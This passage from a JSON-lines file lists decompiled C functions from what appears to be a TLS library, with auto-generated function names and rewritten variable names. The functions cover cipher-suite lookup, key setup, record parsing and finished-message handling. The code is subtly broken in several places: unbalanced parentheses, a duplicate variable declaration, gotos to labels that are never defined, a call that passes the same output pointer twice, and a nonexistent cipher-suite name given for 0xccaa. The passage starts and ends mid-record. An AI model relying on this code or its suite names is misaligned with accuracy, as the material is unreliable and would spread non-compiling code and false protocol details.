\"ECDHE-RSA-AES128GCM-SHA256\"; \n            }\n            if (value_from_memory == 0xc02b) { \n                return \"ECDHE-ECDSA-AES128GCM-SHA256\"; \n            }\n        } else { \n            if (value_from_memory == 0xcca9) { \n                return \"ECDHE-ECDSA-CHACHA20-POLY1305-SHA256\"; \n            }\n            if (value_from_memory == 0xccaa) { \n                return \"ECDHE-DHE-CHACHA20-POLY1305-SHA256\"; \n            }\n            if (value_from_memory == 0xcca8) { \n                return \"ECDHE-RSA-CHACHA20-POLY1305-SHA256\"; \n            }\n        }\n    }\n    \n    return \"UNKNOWN\"; \n}"}
{"Function Name": "FUN_0042bd30", "Address": "0042bd30", "Source Code": "undefined8\nFUN_0042bd30(long input_param_1, ulong *input_param_2, long input_param_3, ulong *input_param_4, long input_param_5, ulong *output_param_6, long context_param)\n{\n    ulong retrieved_value; \n    undefined8 function_result; \n    \n    if (input_param_1 != 0 && input_param_2 != (ulong *)0x0 && input_param_3 != 0 && input_param_4 != (ulong *)0x0 && input_param_5 != 0 && output_param_6 != (ulong *)0x0 && context_param != 0 &&\n        (retrieved_value = (*DAT_00669990)(*(undefined8 *)(context_param + 0x10)), retrieved_value <= *output_param_6)) ) {\n        \n        \n        function_result = (*DAT_00669998)(*(undefined8 *)(context_param + 0x10), input_param_5);\n        \n        \n        if ((int)function_result == 0) {\n            *output_param_6 = retrieved_value; \n            retrieved_value = (*DAT_00669990)(*(undefined8 *)(context_param + 0x18)); \n            \n            \n            if (*input_param_2 < retrieved_value) {\n                return 0xffffffff; \n            }\n            \n            \n            function_result = (*DAT_00669998)(*(undefined8 *)(context_param + 0x18), input_param_1);\n            \n            \n            if ((int)function_result == 0) {\n                *input_param_2 = retrieved_value; \n                retrieved_value = (*DAT_00669990)(*(undefined8 *)(context_param + 0x20)); \n                \n                \n                if (*input_param_4 < retrieved_value) {\n                    return 0xffffffff; \n                }\n                \n                \n                function_result = (*DAT_00669998)(*(undefined8 *)(context_param + 0x20), input_param_3);\n                \n                \n                if ((int)function_result == 0) {\n                    *input_param_4 = retrieved_value; \n                }\n            }\n        }\n        return function_result; \n    }\n    return 0xffffffff; \n}"}
{"Function Name": "FUN_0042be50", "Address": "0042be50", "Source Code": "void FUN_0042be50(long input_param)\n{\n    \n    \n    external_function(*(undefined8 *)(input_param + 0x20), *(undefined8 *)(input_param + 0x18),\n                 *(undefined8 *)(input_param + 8), *(undefined8 *)(input_param + 0x10), 0);\n    \n    \n    *(undefined8 *)(input_param + 0x20) = 0;\n    \n    \n    *(undefined8 *)(input_param + 0x18) = 0;\n    \n    \n    *(undefined8 *)(input_param + 8) = 0;\n    \n    \n    *(undefined8 *)(input_param + 0x10) = 0;\n}"}
{"Function Name": "FUN_0042be90", "Address": "0042be90", "Source Code": "void FUN_0042be90(long input_pointer)\n{\n    \n    if (*(long *)(input_pointer + 0x80) != 0) {\n        \n        cleanup_function();\n        \n        \n        memory_free(*(void **)(input_pointer + 0x80));\n        \n        \n        *(undefined8 *)(input_pointer + 0x80) = 0;\n    }\n}"}
{"Function Name": "FUN_0042bed0", "Address": "0042bed0", "Source Code": "void FUN_0042bed0(long input_param)\n{\n    undefined8 *allocated_memory_ptr; \n    initialize_function(); \n    allocated_memory_ptr = (undefined8 *)allocate_memory(0x28); \n    *(undefined8 **)(input_param + 0x80) = allocated_memory_ptr; \n    if (allocated_memory_ptr != (undefined8 *)0x0) { \n        initialize_memory(allocated_memory_ptr, 0, 0x28); \n    }\n    return; \n}"}
{"Function Name": "FUN_0042bf20", "Address": "0042bf20", "Source Code": "void FUN_0042bf20(void *inputParameter)\n{\n    long longValue; \n    uint unsignedIntCounter; \n    ulong unsignedLongCounter; \n    void *pointerVariable; \n    \n    if (inputParameter == (void *)0x0) {\n        return; \n    }\n    \n    \n    if (*(char *)((long)inputParameter + 0x223ac) == '\\0') {\n        longValue = *(long *)((long)inputParameter + 0x68); \n        \n        if ((longValue != 0) && (*(int *)((long)inputParameter + 0xb0) != 0)) {\n            unsignedLongCounter = 0; \n            while (true) {\n                unsignedIntCounter = (int)unsignedLongCounter + 1; \n                FUN_00427e80(*(undefined8 *)(longValue + unsignedLongCounter * 8)); \n                \n                if (*(uint *)((long)inputParameter + 0xb0) <= unsignedIntCounter) break;\n                unsignedLongCounter = (ulong)unsignedIntCounter; \n            }\n        }\n        \n        \n        pointerVariable = *(void **)((long)inputParameter + 0x22400);\n        \n        if (pointerVariable != (void *)0x0) {\n            \n            if (*(int *)((long)inputParameter + 0x22408) == 0) {\n                free(pointerVariable); \n            } else {\n                unsignedLongCounter = 0; \n                do {\n                    unsignedIntCounter = (int)unsignedLongCounter + 1; \n                    FUN_00427e80(*(undefined8 *)((long)pointerVariable + unsignedLongCounter * 8)); \n                    unsignedLongCounter = (ulong)unsignedIntCounter; \n                } while (unsignedIntCounter < *(uint *)((long)inputParameter + 0x22408)); \n                free(pointerVariable); \n            }\n        }\n        *(undefined8 *)((long)inputParameter + 0x22400) = 0; \n    }\n    \n    \n    if (*(long *)((long)inputParameter + 0x70) != 0) {\n        FUN_00427e80(); \n    }\n    \n    \n    if (*(long *)((long)inputParameter + 0x78) != 0) {\n        FUN_00427e80(); \n    }\n    \n    \n    if (*(void **)((long)inputParameter + 0x68) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x68));\n    }\n    if (*(void **)((long)inputParameter + 0x90) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x90));\n    }\n    if (*(void **)((long)inputParameter + 0x98) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x98));\n    }\n    \n    \n    pointerVariable = *(void **)((long)inputParameter + 0x22410);\n    \n    if (pointerVariable != (void *)0x0) {\n        \n        if (*(char *)((long)inputParameter + 0x22418) != '\\0') {\n            unsignedLongCounter = 0; \n            do {\n                \n                if (*(void **)((long)pointerVariable + unsignedLongCounter * 8) != (void *)0x0) {\n                    free(*(void **)((long)pointerVariable + unsignedLongCounter * 8));\n                }\n                unsignedIntCounter = (int)unsignedLongCounter + 1; \n                unsignedLongCounter = (ulong)unsignedIntCounter; \n            } while (unsignedIntCounter < *(byte *)((long)inputParameter + 0x22418)); \n        }\n        free(pointerVariable); \n    }\n    \n    \n    pointerVariable = *(void **)((long)inputParameter + 0xa8);\n    \n    if (pointerVariable != (void *)0x0) {\n        \n        if (*(int *)((long)inputParameter + 0xb4) != 0) {\n            unsignedLongCounter = 0; \n            do {\n                unsignedIntCounter = (int)unsignedLongCounter + 1; \n                FUN_00427e80(*(undefined8 *)((long)pointerVariable + unsignedLongCounter * 8)); \n                unsignedLongCounter = (ulong)unsignedIntCounter; \n            } while (unsignedIntCounter < *(uint *)((long)inputParameter + 0xb4)); \n        }\n        free(pointerVariable); \n    }\n    \n    *(undefined8 *)((long)inputParameter + 0xa8) = 0; \n    \n    \n    if (*(void **)((long)inputParameter + 0xb8) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0xb8));\n    }\n    if (*(void **)((long)inputParameter + 200) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 200));\n    }\n    \n    \n    if (*(char *)((long)inputParameter + 0x22358) != '\\0') {\n        FUN_004281b0(inputParameter); \n    }\n    \n    \n    if (*(void **)((long)inputParameter + 0x22368) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x22368));\n    }\n    \n    FUN_0042a530(inputParameter); \n    \n    \n    if (*(void **)((long)inputParameter + 0x22360) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x22360));\n    }\n    \n    *(undefined8 *)((long)inputParameter + 0x22360) = 0; \n    \n    \n    if (*(void **)((long)inputParameter + 0x22390) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x22390));\n    }\n    if (*(void **)((long)inputParameter + 0x223a0) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x223a0));\n    }\n    \n    \n    pointerVariable = *(void **)((long)inputParameter + 0x223b0);\n    \n    if (pointerVariable != (void *)0x0) {\n        \n        if (*(byte *)((long)inputParameter + 0x223b8) != 0) {\n            memset(pointerVariable, 0, (ulong)*(byte *)((long)inputParameter + 0x223b8)); \n        }\n        free(pointerVariable); \n    }\n    \n    \n    if (*(void **)((long)inputParameter + 0x223c0) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x223c0));\n    }\n    if (*(void **)((long)inputParameter + 0x223d0) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x223d0));\n    }\n    if (*(void **)((long)inputParameter + 0x223e0) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x223e0));\n    }\n    \n    FUN_0042be90(inputParameter); \n    FUN_0042b130(inputParameter); \n    \n    \n    if (*(void **)((long)inputParameter + 0x22420) != (void *)0x0) {\n        free(*(void **)((long)inputParameter + 0x22420));\n    }\n    \n    free(inputParameter); \n}"}
{"Function Name": "FUN_0042c200", "Address": "0042c200", "Source Code": "void * FUN_0042c200(long input_param_1, undefined8 input_param_2, uint input_param_3, undefined4 *output_param, int input_param_5)\n{\n    long long_value; \n    int return_value; \n    void *allocated_memory_ptr; \n    ulong memory_size; \n    ulong local_memory_size; \n    undefined8 local_allocation_value; \n    *output_param = 0; \n    \n    if (((input_param_3 != 0) && (input_param_1 != 0)) && (*(long *)(input_param_1 + 0x80) != 0)) {\n        memory_size = (ulong)input_param_3; \n        local_allocation_value = 0; \n        local_memory_size = memory_size; \n        return_value = (*DAT_00669910)(&local_allocation_value); \n        if (return_value == 0) { \n            return_value = (*DAT_006699a0)(local_allocation_value, input_param_2, memory_size); \n            if (return_value == 0) { \n                allocated_memory_ptr = malloc(memory_size); \n                long_value = *(long *)(input_param_1 + 0x80); \n                return_value = FUN_00425dd0(long_value, &local_allocation_value, allocated_memory_ptr, &local_memory_size); \n                FUN_0042be50(&local_allocation_value); \n                if (input_param_5 != 0) { \n                    FUN_0042be90(input_param_1); \n                }\n                if (return_value == 0) { \n                    *output_param = (int)local_memory_size; \n                    return allocated_memory_ptr; \n                }\n                if (allocated_memory_ptr != (void *)0x0) { \n                    free(allocated_memory_ptr); \n                }\n            } else {\n                (*DAT_00669920)(local_allocation_value); \n            }\n        }\n    }\n    return (void *)0x0; \n}"}
{"Function Name": "FUN_0042c380", "Address": "0042c380", "Source Code": "undefined8\nFUN_0042c380(int inputSize,long memoryAddress,undefined8 dataPointer,undefined8 controlPointer,int dataSize,int additionalSize)\n{\n    uint functionResult; \n    int operationStatus; \n    size_t allocationSize; \n    void *allocatedMemory; \n    size_t returnedSize; \n    undefined8 finalReturnValue; \n    if (memoryAddress == 0) { \n        finalReturnValue = 0xffffffff; \n    }\n    else {\n        functionResult = FUN_00414410(\"sprng\"); \n        finalReturnValue = 0xc; \n        if ((functionResult < 0x100) && ((&DAT_006495c0)[(long)(int)functionResult * 10] != 0)) { \n            allocationSize = (size_t)inputSize; \n            allocatedMemory = malloc(allocationSize); \n            if (allocatedMemory == (void *)0x0) { \n                finalReturnValue = 0xfffffff7; \n            }\n            else {\n                operationStatus = FUN_0041fe30(inputSize,functionResult,&DAT_006665e0,0); \n                if (((operationStatus == 0) && \n                    (returnedSize = (*(code *)(&DAT_006495e8)[(long)(int)functionResult * 10])(allocatedMemory,allocationSize,&DAT_006665e0),\n                    allocationSize == returnedSize)) && \n                    (operationStatus = FUN_0041ae70(memoryAddress + 0x20,memoryAddress + 0x18,memoryAddress + 8,memoryAddress + 0x10,0),\n                    operationStatus == 0)) { \n                    if (additionalSize < 1) { \n                        operationStatus = (*DAT_00669980)(*(undefined8 *)(memoryAddress + 0x20),controlPointer,0x10); \n                    }\n                    else {\n                        operationStatus = (*DAT_006699a0)(*(undefined8 *)(memoryAddress + 0x20),controlPointer,(long)additionalSize); \n                    }\n                    if (operationStatus == 0) { \n                        if (dataSize < 1) { \n                            operationStatus = (*DAT_00669980)(*(undefined8 *)(memoryAddress + 0x18),dataPointer,0x10); \n                        }\n                        else {\n                            operationStatus = (*DAT_006699a0)(*(undefined8 *)(memoryAddress + 0x18),dataPointer,(long)dataSize); \n                        }\n                        if (((operationStatus == 0) && \n                            (operationStatus = (*DAT_006699a0)(*(undefined8 *)(memoryAddress + 8),allocatedMemory,allocationSize), operationStatus == 0)) && \n                            (operationStatus = (*DAT_00669a40)(*(undefined8 *)(memoryAddress + 0x20),*(undefined8 *)(memoryAddress + 8),\n                            *(undefined8 *)(memoryAddress + 0x18),*(undefined8 *)(memoryAddress + 0x10)), operationStatus == 0)) { \n                            free(allocatedMemory); \n                            return 0; \n                        }\n                    }\n                    free(allocatedMemory); \n                    FUN_0042be50(memoryAddress); \n                    finalReturnValue = 0xffffffff; \n                }\n                else {\n                    free(allocatedMemory); \n                    finalReturnValue = 0xffffffff; \n                }\n            }\n        }\n    }\n    return finalReturnValue; \n}"}
{"Function Name": "FUN_0042c5a0", "Address": "0042c5a0", "Source Code": "undefined8 FUN_0042c5a0(long input_param) \n{\n    if (input_param != 0) { \n        ushort ushort_value = *(ushort *)(input_param + 0x62); \n        if (ushort_value < 0xc025) { \n            if (0xc022 < ushort_value || (ushort)(ushort_value + 0x3ff7) < 2) { \n                return 1; \n            }\n        } else if ((0xc02a < ushort_value) && (ushort_value < 0xc02d || ushort_value == 0xcca9)) { \n            return 1; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042c5e0", "Address": "0042c5e0", "Source Code": "void FUN_0042c5e0(long input_address, undefined8 data_pointer, undefined4 value)\n{\n    \n    FUN_00428330(data_pointer, *(undefined *)(input_address + 0x223d9));\n    \n    \n    FUN_00428380(data_pointer, 0);\n    \n    \n    FUN_00428380(data_pointer, value);\n}"}
{"Function Name": "FUN_0042c620", "Address": "0042c620", "Source Code": "void FUN_0042c620(long *source_address)\n{\n    \n    *(undefined *)(*source_address + 0x16) = *(undefined *)(*source_address + 0xe);\n    \n    \n    *(undefined *)(*source_address + 0x17) = *(undefined *)(*source_address + 0xf);\n    \n    \n    *(undefined *)(*source_address + 0x18) = *(undefined *)(*source_address + 0x10);\n}"}
{"Function Name": "FUN_0042c640", "Address": "0042c640", "Source Code": "void FUN_0042c640(long input_address)\n{\n    \n    \n    if (((*(short *)(input_address + 100) != -0x104) && (*(short *)(input_address + 100) != 0x304)) ||\n        (*(char *)(input_address + 0x60) != ' ')) {\n        \n        \n        \n        \n        *(byte *)(input_address + 0x60) = ~-(check_function(input_address + 0x40, 0x20) == 0) & 0x20;\n    }\n    \n    return;\n}"}
{"Function Name": "FUN_0042c680", "Address": "0042c680", "Source Code": "undefined8 FUN_0042c680(long input_pointer)\n{\n    \n    if ((*(long *)(input_pointer + 0x223d0) != 0) && (*(char *)(input_pointer + 0x223d8) != '\\0')) {\n        return 1; \n    }\n    \n    \n    if ((*(void **)(input_pointer + 0x223d0) = malloc(0x20)) != (void *)0x0) {\n        return process_data(input_pointer); \n    }\n    \n    return 0; \n}"}
{"Function Name": "FUN_0042c6e0", "Address": "0042c6e0", "Source Code": "undefined8 FUN_0042c6e0(undefined8 input_value, int threshold_value)\n{\n    \n    if (10 < threshold_value) {\n        \n        return FUN_00405c50();\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_0042c870", "Address": "0042c870", "Source Code": "void FUN_0042c870(long object_pointer)\n{\n    \n    if (*(void **)(object_pointer + 0x223d0) != NULL) {\n        \n        deallocate_memory(*(void **)(object_pointer + 0x223d0));\n    }\n    \n    *(void **)(object_pointer + 0x223d0) = NULL;\n    \n    *(undefined *)(object_pointer + 0x223d8) = 0;\n}"}
{"Function Name": "FUN_0042c8a0", "Address": "0042c8a0", "Source Code": "int FUN_0042c8a0(ushort *input_value, int threshold, ushort **output_pointer, uint *output_value)\n{\n    ushort swapped_value; \n    *output_pointer = (ushort *)0x0; \n    *output_value = 0; \n    if (threshold > 1) { \n        swapped_value = *input_value >> 8 | *input_value << 8; \n        if (swapped_value <= threshold - 2) { \n            *output_pointer = input_value + 1; \n            *output_value = (uint)swapped_value; \n            return swapped_value + 2; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042ca60", "Address": "0042ca60", "Source Code": "int FUN_0042ca60(long param_1)\n{\n    int returnValue; \n    undefined8 *allocatedMemoryPtr; \n    long addressFromParam; \n    uint unsignedIntValue; \n    ushort ushortValue; \n    \n    returnValue = FUN_004283b0(&ushortValue, 0x30);\n    \n    \n    if (returnValue != 0) {\n        \n        addressFromParam = *(long *)(param_1 + 0x18);\n        \n        \n        if (*(char *)(addressFromParam + 0x66) == '\\0') {\n            \n            ushortValue = (-(ushort)(*(char *)(addressFromParam + 0x223c9) == '\\0') & 0x505) - 0x202;\n        } else {\n            \n            ushortValue = *(ushort *)(addressFromParam + 100) >> 8 | *(ushort *)(addressFromParam + 100) << 8;\n        }\n        \n        \n        if (*(void **)(addressFromParam + 200) != (void *)0x0) {\n            \n            free(*(void **)(addressFromParam + 200));\n        }\n        \n        \n        allocatedMemoryPtr = (undefined8 *)malloc(0x30);\n        \n        \n        *(undefined8 **)(addressFromParam + 200) = allocatedMemoryPtr;\n        \n        \n        if (allocatedMemoryPtr == (undefined8 *)0x0) {\n            return -9; \n        }\n        \n        \n        *(undefined4 *)(addressFromParam + 0xd0) = 0x30;\n        \n        \n        *allocatedMemoryPtr = CONCAT62(0, ushortValue);\n        \n        \n        addressFromParam = *(long *)(param_1 + 0x18);\n        \n        \n        void *resultPtr = (void *)FUN_004284b0(addressFromParam, *(undefined8 *)(addressFromParam + 200), *(undefined4 *)(addressFromParam + 0xd0), &unsignedIntValue);\n        \n        \n        FUN_00429d90(*(undefined8 *)(param_1 + 0x18), 0x30);\n        \n        \n        if (resultPtr != (void *)0x0) {\n            \n            if (2 < unsignedIntValue) {\n                \n                FUN_00428380(param_1, unsignedIntValue + 2);\n                \n                \n                if (*(char *)(*(long *)(param_1 + 0x18) + 0x223c9) != '\\0') {\n                    \n                    FUN_0042c5e0(*(long *)(param_1 + 0x18), param_1, unsignedIntValue + 2);\n                }\n                \n                \n                FUN_00428330(param_1, (undefined2)unsignedIntValue);\n                \n                \n                FUN_00428240(param_1, resultPtr, unsignedIntValue);\n                \n                \n                free(resultPtr);\n                \n                \n                return unsignedIntValue + 2;\n            }\n            \n            free(resultPtr);\n        }\n    }\n    \n    return -1;\n}"}
{"Function Name": "FUN_0042cbf0", "Address": "0042cbf0", "Source Code": "byte * FUN_0042cbf0(long input_address, byte *data_buffer, int length, uint *output_value_1, uint *output_value_2, uint *output_value_3, int *output_length)\n{\n    short short_value; \n    ushort swapped_value; \n    long min_length = 4; \n    long byte_offset = 2; \n    \n    if (length < 2) {\n        return (byte *)0x0; \n    }\n    \n    short_value = *(short *)(input_address + 100);\n    *output_value_1 = 0xff; \n    *output_value_2 = 1; \n    *output_value_3 = 0; \n    \n    if (1 < (ushort)(short_value - 0x303U)) {\n        \n        if (1 < (ushort)(short_value + 0x104U)) {\n            min_length = 2; \n            byte_offset = 0; \n        }\n    }\n    \n    *output_value_1 = (uint)*data_buffer; \n    *output_value_2 = (uint)data_buffer[1]; \n    \n    swapped_value = *(ushort *)(data_buffer + byte_offset) >> 8 | *(ushort *)(data_buffer + byte_offset) << 8;\n    \n    \n    if (length - (int)min_length < (int)(uint)swapped_value) {\n        return (byte *)0x0; \n    }\n    *output_value_3 = (uint)swapped_value; \n    *output_length = (uint)swapped_value + (int)min_length; \n    return data_buffer + min_length; \n}"}
{"Function Name": "FUN_0042cc80", "Address": "0042cc80", "Source Code": "ulong FUN_0042cc80(undefined8 *input_ptr, byte *data_ptr, int data_length)\n{\n    byte byte_value; \n    undefined8 result_value; \n    undefined4 function_result; \n    int remaining_length; \n    undefined8 *ptr; \n    ulong error_code; \n    char char_value; \n    int status; \n    long offset; \n    byte *source_ptr; \n    uint byte_count; \n    int remaining_bytes; \n    undefined4 *local_ptr; \n    byte *local_data_ptr; \n    int local_length; \n    undefined4 local_value; \n    undefined local_array[4]; \n    int local_counter; \n    int local_index; \n    \n    \n    if (data_length < 3) {\n        return 0; \n    }\n    \n    \n    char_value = *(char *)((long)input_ptr + 0x223c9);\n    \n    \n    status = (uint)data_ptr[2] + ((uint)*data_ptr * 0x100 + (uint)data_ptr[1]) * 0x100;\n    \n    \n    if (char_value == '\\0') {\n        offset = 3; \n        byte_count = 3; \n    } else if (data_length < 0xb) {\n        offset = 0xb; \n        byte_count = 0xb; \n    } else {\n        \n        error_code = FUN_00405c50(data_ptr);\n        if ((int)error_code < 0) {\n            return error_code; \n        }\n        offset = 0xb; \n        byte_count = 0xb; \n    }\n    \n    \n    remaining_bytes = data_length - byte_count;\n    \n    \n    if (remaining_bytes < status) {\n        return 0; \n    }\n    \n    \n    if (status == 0) {\n        return (ulong)byte_count; \n    }\n    \n    \n    source_ptr = data_ptr + offset;\n    \n    \n    status = FUN_0042b990(input_ptr);\n    if (status == 0) {\n        \n        local_data_ptr = (byte *)0x0; \n        local_ptr = (undefined4 *)0x0; \n        byte_value = 0; \n        data_ptr = source_ptr; \n        local_counter = 0; \n        local_index = 0; \n        local_value = 0; \n        local_array[0] = 0; \n        remaining_length = byte_count - 3; \n        \n        \n        if (char_value != '\\0') {\n            remaining_length = byte_count - 0xb; \n        }\n        \n        \n        offset = FUN_0042cbf0(input_ptr, data_ptr, remaining_bytes, &local_value, local_array, &local_length, &local_counter);\n        \n        \n        if ((0 < local_length) && (offset != 0)) {\n            byte_count = byte_count + local_counter; \n            \n            \n            ptr = (undefined8 *)malloc((ulong)(remaining_length + 0x40U));\n            if (ptr == (undefined8 *)0x0) {\n                \n                if (status == 1) {\n                    FUN_0042bed0(input_ptr); \n                    status = local_counter; \n                    if (local_counter <= local_index) {\n                        status = local_index; \n                    }\n                    \n                    status = FUN_0042c380(status, input_ptr[0x10], 0, 0);\n                    if (status != 0) {\n                        \n                        if ((void *)input_ptr[0x10] != (void *)0x0) {\n                            free((void *)input_ptr[0x10]);\n                        }\n                        input_ptr[0x10] = 0; \n                        return 0xffffffff; \n                    }\n                    local_length = 0; \n                    \n                    offset = FUN_0042c200(input_ptr, 0, 0, &local_length, 0);\n                    \n                    if ((offset != 0) && (local_length != 0)) {\n                        \n                        if ((void *)input_ptr[0x19] != (void *)0x0) {\n                            free((void *)input_ptr[0x19]);\n                        }\n                        input_ptr[0x19] = offset; \n                        *(int *)(input_ptr + 0x1a) = local_length; \n                    }\n                }\n                \n                else if ((((status == 2) && (local_ptr != (undefined4 *)0x0)) && (local_data_ptr != (byte *)0x0)) && (byte_value != 0)) {\n                    \n                    if (DAT_006698df == '\\0') {\n                        FUN_00428410(); \n                    }\n                    FUN_0042b280(input_ptr); \n                    result_value = input_ptr[0x11]; \n                    function_result = FUN_00414410(\"sprng\"); \n                    \n                    status = FUN_0041c770(0, function_result, result_value, local_ptr + 0x10);\n                    if (status != 0) {\n                        \n                        if ((void *)input_ptr[0x11] != (void *)0x0) {\n                            free((void *)input_ptr[0x11]);\n                        }\n                        input_ptr[0x11] = 0; \n                        return 0xffffffff; \n                    }\n                    \n                    if ((void *)input_ptr[0x19] != (void *)0x0) {\n                        free((void *)input_ptr[0x19]);\n                    }\n                    *(undefined4 *)(input_ptr + 0x1a) = 0; \n                    local_length = 0; \n                    \n                    offset = FUN_0042b170(input_ptr, local_data_ptr, byte_value, &local_length, 0);\n                    input_ptr[0x19] = offset; \n                    if (offset != 0) {\n                        *(int *)(input_ptr + 0x1a) = local_length; \n                    }\n                }\n                return (ulong)byte_count; \n            }\n            \n            *ptr = input_ptr[4];\n            ptr[1] = input_ptr[5];\n            ptr[2] = input_ptr[6];\n            ptr[3] = input_ptr[7];\n            ptr[4] = *input_ptr;\n            ptr[5] = input_ptr[1];\n            ptr[6] = input_ptr[2];\n            ptr[7] = input_ptr[3];\n            \n            memcpy(ptr + 8, source_ptr, (long)remaining_length);\n            \n            remaining_bytes = FUN_00428630(input_ptr, local_value, offset, local_length, ptr, remaining_length + 0x40U);\n            if (remaining_bytes == 1) {\n                free(ptr); \n                goto LAB_0042cecd; \n            }\n            free(ptr); \n        }\n    }\n    else {\n        \n        if (status != 1) {\n            \n            if (*source_ptr != 3) {\n                return 0; \n            }\n            \n            if ((int)(data_length - (byte_count + 1)) < 3) {\n                return 0; \n            }\n            remaining_bytes = byte_count + 4; \n            byte_value = data_ptr[(int)(byte_count + 3)]; \n            \n            if (data_length - remaining_bytes < (int)(uint)byte_value) {\n                return 0; \n            }\n            error_code = 0xffffffff; \n            \n            switch (*(ushort *)(data_ptr + (int)(byte_count + 1)) >> 8 | *(ushort *)(data_ptr + (int)(byte_count + 1)) << 8) {\n                case 0x13:\n                    local_ptr = &DAT_00649500; \n                    break;\n                case 0x14:\n                    local_ptr = &DAT_00649400; \n                    break;\n                case 0x15:\n                    local_ptr = &DAT_00649480; \n                    break;\n                case 0x16:\n                    local_ptr = &DAT_00649300; \n                    break;\n                case 0x17:\n                    local_ptr = &DAT_00649380; \n                    break;\n                case 0x18:\n                    local_ptr = &DAT_00649280; \n                    break;\n                case 0x19:\n                    local_ptr = &DAT_00649200; \n                    break;\n                default:\n                    goto switchD_0042d003_caseD_7; \n            }\n            byte_count = remaining_bytes + (uint)byte_value; \n            local_data_ptr = data_ptr + remaining_bytes; \n            remaining_bytes = data_length - byte_count; \n            data_ptr = data_ptr + byte_count; \n            input_ptr[0x14] = local_ptr; \n            goto LAB_0042cd9d; \n        }\n        \n        local_counter = 0; \n        local_index = 0; \n        local_value = 0; \n        \n        remaining_bytes = FUN_0042c8a0(source_ptr, remaining_bytes, &local_counter, &local_counter);\n        if (0 < remaining_bytes) {\n            remaining_bytes = byte_count + remaining_bytes; \n            \n            remaining_length = FUN_0042c8a0(data_ptr + remaining_bytes, data_length - remaining_bytes, &local_value, &local_index);\n            if (remaining_length < 1) goto LAB_0042ceba; \n            remaining_bytes = remaining_bytes + remaining_length; \n            \n            remaining_length = FUN_0042c8a0(data_ptr + remaining_bytes, data_length - remaining_bytes, local_array, &local_value);\n            if (remaining_length < 1) goto LAB_0042ceba; \n            byte_count = remaining_bytes + remaining_length; \n            local_data_ptr = (byte *)0x0; \n            local_ptr = (undefined4 *)0x0; \n            data_ptr = data_ptr + (int)byte_count; \n            byte_value = 0; \n            remaining_bytes = data_length - byte_count; \n            goto LAB_0042cdd0; \n        }\n    }\nLAB_0042ceba:\n    error_code = 0xfffffffe; \nswitchD_0042d003_caseD_7:\n    return error_code; \n}"}
{"Function Name": "FUN_0042d270", "Address": "0042d270", "Source Code": "int FUN_0042d270(long input_address, byte *data_buffer, int buffer_size)\n{\n    int status_code; \n    int error_code = -6; \n    \n    if ((*(char *)(input_address + 0x22388) == '\\x01') && (error_code = 0, 2 < buffer_size)) {\n        \n        int calculated_size = (uint)data_buffer[2] + ((uint)*data_buffer * 0x100 + (uint)data_buffer[1]) * 0x100;\n        \n        if (*(char *)(input_address + 0x223c9) == '\\0') {\n            status_code = 3; \n        } else if (buffer_size < 0xb) {\n            status_code = 0xb; \n        } else {\n            \n            error_code = FUN_00405c50(data_buffer);\n            if (error_code < 0) {\n                return error_code; \n            }\n            status_code = 0xb; \n        }\n        \n        if ((calculated_size <= buffer_size - status_code) && (calculated_size != 0)) {\n            \n            error_code = FUN_0042c8f0(input_address, data_buffer + status_code, calculated_size);\n            if (error_code < 1) {\n                error_code = -2; \n            } else {\n                *(undefined *)(input_address + 0x22388) = 2; \n                error_code = status_code + calculated_size; \n            }\n        }\n    }\n    return error_code; \n}"}
{"Function Name": "FUN_0042d340", "Address": "0042d340", "Source Code": "ulong FUN_0042d340(long input_param, byte *byte_array, int threshold)\n{\n    ulong result = 0; \n    int calculated_value; \n    \n    if (2 < threshold) {\n        \n        calculated_value = (uint)byte_array[2] + ((uint)*byte_array * 0x100 + (uint)byte_array[1]) * 0x100;\n        \n        if (*(char *)(input_param + 0x223c9) != '\\0' && threshold >= 0xb) {\n            \n            result = FUN_00405c50(byte_array);\n            \n            if ((int)result < 0) {\n                return result;\n            }\n        }\n        \n        if (calculated_value <= threshold - 3) {\n            \n            result = (ulong)(uint)(3 + calculated_value);\n        }\n    }\n    \n    return result;\n}"}
{"Function Name": "FUN_0042d3c0", "Address": "0042d3c0", "Source Code": "ulong FUN_0042d3c0(long input_param, byte *data_buffer, int length_param, undefined4 *output_param)\n{\n    undefined4 return_value; \n    int comparison_result; \n    ulong function_return_value; \n    char *finished_message; \n    uint computed_value; \n    int min_required_length; \n    \n    if (0xfc < (byte)(*(char *)(input_param + 0x22388) - 2U)) {\n        return 0xfffffffa; \n    }\n    \n    *output_param = 0; \n    \n    \n    if (length_param < 3) {\n        return 0; \n    }\n    \n    \n    computed_value = ((uint)data_buffer[1] + (uint)*data_buffer * 0x100) * 0x100 + (uint)data_buffer[2];\n    \n    \n    if (*(char *)(input_param + 0x223c9) == '\\0') {\n        min_required_length = 3; \n    } else if (length_param < 0xb) {\n        min_required_length = 0xb; \n    } else {\n        function_return_value = FUN_00405c50(data_buffer); \n        if ((int)function_return_value < 0) {\n            return function_return_value; \n        }\n        min_required_length = 0xb; \n    }\n    \n    \n    if (computed_value < 0xc) {\n        return 0xfffffffe; \n    }\n    \n    \n    if (length_param - min_required_length < (int)computed_value) {\n        return 0; \n    }\n    \n    return_value = FUN_0042a710(input_param, NULL); \n    void *allocated_memory = malloc((ulong)computed_value); \n    if (allocated_memory == (void *)0x0) {\n        return 0xfffffff7; \n    }\n    \n    int comparison_result = *(int *)(input_param + 0xc0); \n    long long_value = *(long *)(input_param + 0xb8); \n    \n    \n    if (*(char *)(input_param + 0x66) == '\\0') {\n        \n        if ((comparison_result == 0) || (long_value == 0)) goto LAB_0042d483; \n        finished_message = \"server finished\"; \n    } else {\n        \n        if ((comparison_result == 0) || (long_value == 0)) goto LAB_0042d483; \n        finished_message = \"client finished\"; \n    }\n    \n    \n    FUN_00426a30(input_param, 